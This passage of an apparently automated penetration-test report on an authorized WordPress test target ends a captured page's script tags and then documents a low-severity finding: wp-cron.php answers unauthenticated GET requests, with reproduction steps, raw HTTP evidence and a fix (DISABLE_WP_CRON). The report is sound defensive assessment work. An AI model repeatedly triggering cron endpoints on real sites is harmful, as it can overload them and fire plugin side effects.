wp.date.setSettings( {"l10n":{"locale":"en_US","months":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthsShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"weekdays":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"weekdaysShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"meridiem":{"am":"am","pm":"pm","AM":"AM","PM":"PM"},"relative":{"future":"%s from now","past":"%s ago","s":"a second","ss":"%d seconds","m":"a minute","mm":"%d minutes","h":"an hour","hh":"%d hours","d":"a day","dd":"%d days","M":"a month","MM":"%d months","y":"a year","yy":"%d years"},"startOfWeek":1},"formats":{"time":"g:i a","date":"F j, Y","datetime":"F j, Y g:i a","datetimeAbbreviated":"M j, Y g:i a"},"timezone":{"offset":0,"offsetFormatted":"0","string":"","abbr":""}} );
//# sourceURL=wp-date-js-after
</script>
<script id="wp-primitives-js" src="http://target.local:32812/wp-includes/js/dist/primitives.min.js?ver=a5c905ec27bcd76ef287"></script>
<script id="wp-components-js" src="http://target.local:32812/wp-includes/js/dist/components.min.js?ver=5dedfe13f08880193a28"></script>
<script id="wp-keyboard-shortcuts-js" src="http://target.local:32812/wp-includes/js/dist/keyboard-shortcuts.min.js?ver=2ed78d3b4c23f38804e0"></script>
<script id="wp-commands-js" src="http://target.local:32812/wp-includes/js/dist/commands.min.js?ver=e3d8bba53f4ffea4fcd2"></script>
<script id="wp-notices-js" src="http://target.local:32812/wp-includes/js/dist/notices.min.js?ver=218d0173a31ae7269246"></script>
<script id="wp-preferences-persistence-js" src="http://target.local:32812/wp-includes/js/dist/preferences-persistence.min.js?ver=e8033be98338d1861bca"></script>
<script id="wp-preferences-js" src="http://target.local:32812/wp-includes/js/dist/preferences.min.js?ver=035813168e404aa30193"></script>
<script id="wp-preferences-js-after">
( function() {
				var serverData = false;
				var userId = "0";
				var persistenceLayer = wp.preferencesPersistence.__unstableCreatePersistenceLayer( serverData, userId );
				var preferencesStore = wp.preferences.store;
				wp.data.dispatch( preferencesStore ).setPersistenceLayer( persistenceLayer );
			} ) ();
//# sourceURL=wp-preferences-js-after
</script>
<script id="wp-style-engine-js" src="http://target.local:32812/wp-includes/js/dist/style-engine.min.js?ver=faa37ce61b7ec8394b2a"></script>
<script id="wp-theme-js" src="http://target.local:32812/wp-includes/js/dist/theme.min.js?ver=e22ce547a4420507b323"></script>
<script id="wp-token-list-js" src="http://target.local:32812/wp-includes/js/dist/token-list.min.js?ver=16f0aebdd39d87c2a84b"></script>
<script id="wp-upload-media-js" src="http://target.local:32812/wp-includes/js/dist/upload-media.min.js?ver=d359c2cccf866d7082d2"></script>
<script id="wp-block-editor-js" src="http://target.local:32812/wp-includes/js/dist/block-editor.min.js?ver=93c3566b7f24c15b7e17"></script>
<script id="rock-tune-header-search-script-js" src="http://target.local:32812/wp-content/themes/rock-tune/inc/blocks/dist/header-search.js?ver=1718671541"></script>
<script id="clipboard-js" src="http://target.local:32812/wp-includes/js/clipboard.min.js?ver=2.0.11"></script>
<script id="jquery-core-js" src="http://target.local:32812/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
<script id="jquery-migrate-js" src="http://target.local:32812/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
<script id="zxcvbn-async-js-extra">
var _zxcvbnSettings = {"src":"http://target.local:32812/wp-includes/js/zxcvbn.min.js"};
//# sourceURL=zxcvbn-async-js-extra
</script>
<script id="zxcvbn-async-js" src="http://target.local:32812/wp-includes/js/zxcvbn-async.min.js?ver=1.0"></script>
<script id="password-strength-meter-js-extra">
var pwsL10n = {"unknown":"Password strength unknown","short":"Very weak","bad":"Weak","good":"Medium","strong":"Strong","mismatch":"Mismatch"};
//# sourceURL=password-strength-meter-js-extra
</script>
<script id="password-strength-meter-js" src="http://target.local:32812/wp-admin/js/password-strength-meter.min.js?ver=7.0"></script>
<script id="underscore-js" src="http://target.local:32812/wp-includes/js/underscore.min.js?ver=1.13.8"></script>
<script id="wp-util-js-extra">
var _wpUtilSettings = {"ajax":{"url":"/wp-admin/admin-ajax.php"}};
//# sourceURL=wp-util-js-extra
</script>
<script id="wp-util-js" src="http://target.local:32812/wp-includes/js/wp-util.min.js?ver=7.0"></script>
<script id="user-profile-js-extra">
var userProfileL10n = {"user_id":"0","nonce":"84877eb68a"};
//# sourceURL=user-profile-js-extra
</script>
<script id="user-profile-js" src="http://target.local:32812/wp-admin/js/user-profile.min.js?ver=7.0"></script>
	</body>
	</html>
```

<a id="finding-15"></a>

### 15. [SUSPECTED] [LOW] [misconfig] wp-cron.php publicly accessible without authentication

- Screen: `s-0033`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

**Anomaly (why this is a lead):** Three independent unauthenticated GET requests to /wp-cron.php each return HTTP 200 with empty body. WordPress cron trigger is exposed publicly, allowing any unauthenticated caller to fire scheduled jobs — enabling DoS via repeated hammering or chaining with vulnerable registered cron hooks. Should be disabled (DISABLE_WP_CRON in wp-config.php) or blocked at the webserver.

WordPress installs /wp-cron.php at the web root and it responds to unauthenticated HTTP GET requests with HTTP 200. The file triggers all due scheduled actions on each request. Public access allows attackers to invoke scheduled jobs arbitrarily, which can cause excessive load (DoS) or trigger side-effects in plugins that register cron hooks (e.g. sending emails, performing HTTP fetches, clearing caches). WordPress documentation recommends disabling this in wp-config.php (define('DISABLE_WP_CRON', true)) and using a real system-level cron job instead.

**Reproduction**

```
1. Send `GET /wp-cron.php` without any credentials or session cookie.
2. Observe HTTP 200 with empty body — cron jobs are triggered.
3. Repeat at will; no rate limiting, no authentication required.
```

**Evidence**

- Evidence `ev-mr0v671b-6z` — `artifacts/s-0033/ev-mr0v671b-6z/`

Request:

```http
GET /wp-cron.php HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache, must-revalidate, max-age=0
connection: Keep-Alive
content-length: 0
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:31:30 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
```
